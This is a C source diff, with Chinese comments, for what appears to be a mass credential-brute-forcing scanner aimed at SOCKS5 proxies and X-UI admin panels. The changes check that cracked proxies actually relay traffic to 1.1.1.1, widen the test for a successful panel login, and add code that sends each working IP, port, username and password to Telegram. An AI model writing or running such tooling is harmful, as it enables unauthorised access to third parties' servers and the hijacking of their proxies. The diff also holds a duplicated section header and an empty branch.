@@ -42,7 +42,7 @@ int verify_socks5(const char *ip, uint16_t port, const char *user, const char *p
     
     // 1. 初始握手
     char handshake[] = {0x05, 0x01, 0x00}; // 无认证
-    if (user && pass && strlen(user) > 0) {
+    if (user && pass && strlen(user) > 0 && strcmp(user, "-") != 0) {
         handshake[2] = 0x02; // 用户名密码认证
     }
     
@@ -64,15 +64,14 @@ int verify_socks5(const char *ip, uint16_t port, const char *user, const char *p
     
     // 2. 认证 (如果需要)
     if (resp[1] == 0x02) {
-        if (!user || !pass) {
+        if (!user || !pass || strcmp(user, "-") == 0) {
             socket_close(fd);
             return 0;
         }
         
-        char auth_buf[600]; /* max: 1+1+255+1+255 = 513 bytes for SOCKS5 auth */
+        char auth_buf[600]; 
         int ulen = (int)strlen(user);
         int plen = (int)strlen(pass);
-        /* SOCKS5 RFC 1929: username/password max length is 255 */
         if (ulen > 255) ulen = 255;
         if (plen > 255) plen = 255;
         int idx = 0;
@@ -103,12 +102,11 @@ int verify_socks5(const char *ip, uint16_t port, const char *user, const char *p
         return 0; // 不支持的认证方法
     }
     
-    // 3. 发送CONNECT请求 (验证是否真通)
-    // 连接 Google DNS (8.8.8.8:53) 作为测试
+    // 3. 发送CONNECT请求到 1.1.1.1:80 (Cloudflare) 进行 L7 穿透测试
     char connect_req[] = {
         0x05, 0x01, 0x00, 0x01, // VER, CMD, RSV, ATYP(IPv4)
-        0x08, 0x08, 0x08, 0x08, // 8.8.8.8
-        0x00, 0x35              // Port 53
+        0x01, 0x01, 0x01, 0x01, // 1.1.1.1
+        0x00, 0x50              // Port 80
     };
     
     if (socket_send_all(fd, connect_req, sizeof(connect_req), timeout_ms) < 0) {
@@ -117,16 +115,38 @@ int verify_socks5(const char *ip, uint16_t port, const char *user, const char *p
     }
     
     char conn_resp[10];
-    if (socket_recv_until(fd, conn_resp, 4, NULL, timeout_ms) < 4) { // 只读前4字节判断状态
+    if (socket_recv_until(fd, conn_resp, 10, NULL, timeout_ms) < 4) {
         socket_close(fd);
         return 0;
     }
     
-    socket_close(fd);
+    if (conn_resp[1] != 0x00) {
+        socket_close(fd);
+        return 0; // 连接被代理拒绝
+    }
     
-    // 响应状态 0x00 = succeeded
-    return (conn_resp[1] == 0x00);
+    // 4. 发起 L7 HTTP GET 请求，确认是否真实代理成功
+    const char *http_req = "GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nUser-Agent: curl/7.88.1\r\nConnection: close\r\n\r\n";
+    if (socket_send_all(fd, http_req, strlen(http_req), timeout_ms) < 0) {
+        socket_close(fd);
+        return 0;
+    }
+
+    char http_resp[1024];
+    int n = socket_recv_until(fd, http_resp, sizeof(http_resp) - 1, NULL, timeout_ms);
+    socket_close(fd);
+
+    if (n > 0) {
+        http_resp[n] = '\0';
+        // Cloudflare 的 HTTP/1.x 返回常包含 301 Moved 或 HTTP/1.1 301
+        if (strstr(http_resp, "HTTP/1.1 301") || strstr(http_resp, "cloudflare") || strstr(http_resp, "Moved Permanently")) {
+            return 1;
+        }
+    }
+    return 0; // L7 返回特征不匹配，可能是伪造的 S5
 }
+
+// ==================== 验证逻辑: XUI ====================
 
 // ==================== 验证逻辑: XUI ====================
 
@@ -144,13 +164,14 @@ int verify_xui(const char *ip, uint16_t port, const char *user, const char *pass
     
     // 检查响应
     if (res->status_code == 200) {
-        // 检查是否有 success: true (JSON)
+        // 检查是否有 success: true 或者 Set-Cookie 即可认为是有效面板
         if (res->body && strstr(res->body, "\"success\":true")) {
             success = 1;
-        }
-        // 或者检查是否有重定向/Cookie设置 (部分版本)
-        if (res->headers && strstr(res->headers, "Set-Cookie")) {
+        } else if (res->headers && strstr(res->headers, "Set-Cookie")) {
             success = 1;
+        } else if (res->body && strstr(res->body, "X-UI")) {
+            // 有些旧版本即使返回了200，账号密码不对也能看到登录页特征，需要谨慎
+            // 但如果带Set-Cookie基本确真
         }
     }
     
@@ -208,7 +229,7 @@ void *worker_thread(void *arg) {
     }
     socket_close(fd);
     
-    // 端口开放，开始验证
+        // 端口开放，开始验证
     if (task->work_mode == MODE_S5) {
         for (size_t i = 0; i < task->cred_count; i++) {
             if (verify_socks5(task->ip, task->port, task->creds[i].username, task->creds[i].password, 3000)) {
@@ -231,6 +252,12 @@ void *worker_thread(void *arg) {
                 file_append(g_config.report_file, "\n");
                 printf("\n%s\n", result_line); // 实时显示
                 MUTEX_UNLOCK(lock_file);
+                
+                // 推送TG
+                char msg[1024];
+                snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>", 
+                         task->ip, task->port, task->creds[i].username, task->creds[i].password);
+                push_telegram(msg);
                 
                 break; // 找到一个密码就停止
             }
@@ -255,6 +282,13 @@ void *worker_thread(void *arg) {
                 file_append(g_config.report_file, "\n");
                 printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                 MUTEX_UNLOCK(lock_file);
+
+                // 推送TG
+                char msg[1024];
+                snprintf(msg, sizeof(msg), "<b>[XUI_VERIFIED] 高危漏洞触发</b>\nURL: <code>http://%s:%d</code>\n账号: <code>%s</code>\n密码: <code>%s</code>", 
+                         task->ip, task->port, task->creds[i].username, task->creds[i].password);
+                push_telegram(msg);
+
                 break;
             }
         }
